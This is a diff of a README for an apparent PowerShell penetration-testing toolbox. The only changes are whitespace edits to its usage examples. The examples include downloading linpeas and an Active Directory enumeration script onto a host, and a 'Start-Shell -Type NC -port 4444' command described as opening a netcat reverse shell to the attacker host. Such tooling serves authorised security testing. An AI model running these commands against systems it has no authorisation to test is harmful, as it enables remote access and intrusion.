@@ -40,22 +40,22 @@ You will be prompted for your ip and the web server port.
 
 	#Show the current config
 	Show-PSToolboxConfig
--
+
 	#Reset the config
 	Set-PSToolboxConfig
--
+
 	#Download all linked files that match linpeas	
 	gti -m linpeas
--	
+	
 	#Download a single toolbox item instead of doing a recursive search
 	Get-SingleToolboxItem -item 'enum/adenumv2.ps1'
--
+
 	#download single item and save with different name
 	Get-SingleToolboxItem -item 'enum/adenumv2.ps1' -name 'ad.ps1'
--
+
 	#Start a netcat reverse shell to the attacker host
 	Start-Shell -Type NC -port 4444
--
+
 This project is licensed under the MIT License - see the LICENSE.md file for details.
 Acknowledgments
 
